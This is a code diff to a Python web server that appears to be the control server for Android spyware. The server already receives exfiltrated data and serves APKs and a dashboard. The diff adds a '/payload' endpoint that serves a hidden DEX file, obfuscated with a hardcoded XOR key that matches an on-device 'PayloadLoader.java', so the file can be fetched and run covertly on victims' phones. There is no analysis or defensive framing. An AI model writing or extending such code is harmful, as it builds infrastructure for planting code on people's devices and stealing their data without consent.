@@ -17,7 +17,12 @@ received_data = {}
 data_lock = threading.Lock()
 HERE = os.path.dirname(os.path.abspath(__file__))
 APK_DIR = os.path.join(HERE, "apk")
+PAYLOAD_DIR = os.path.join(HERE, "payload")
 os.makedirs(APK_DIR, exist_ok=True)
+os.makedirs(PAYLOAD_DIR, exist_ok=True)
+
+# XOR key matching PayloadLoader.java
+XK = [0x4A, 0x7D, 0x2B, 0x6F, 0x1C, 0x5E, 0x3A, 0x8F]
 
 # ── Single CSS block used by all pages ──
 C = """
@@ -233,6 +238,7 @@ class Handler(BaseHTTPRequestHandler):
         elif p.startswith('/thumbnails/'): self._serve_thumb(p)
         elif p == '/data': self._serve_data()
         elif p == '/myip': self._text(socket.gethostbyname(socket.gethostname()))
+        elif p == '/payload': self._serve_payload()
         elif p == '/dashboard': self._html(self._dash())
         else: self.send_error(404)
 
@@ -302,6 +308,22 @@ class Handler(BaseHTTPRequestHandler):
         self.end_headers()
         with open(tp, 'rb') as f:
             self.wfile.write(f.read())
+
+    def _serve_payload(self):
+        pp = os.path.join(PAYLOAD_DIR, "payload.dex")
+        if not os.path.exists(pp):
+            self.send_error(404)
+            return
+        with open(pp, 'rb') as f:
+            raw = f.read()
+        enc = bytes([raw[i] ^ XK[i % len(XK)] for i in range(len(raw))])
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/octet-stream')
+        self.send_header('Content-Length', str(len(enc)))
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Connection', 'close')
+        self.end_headers()
+        self.wfile.write(enc)
 
     def _exfil(self):
         try:
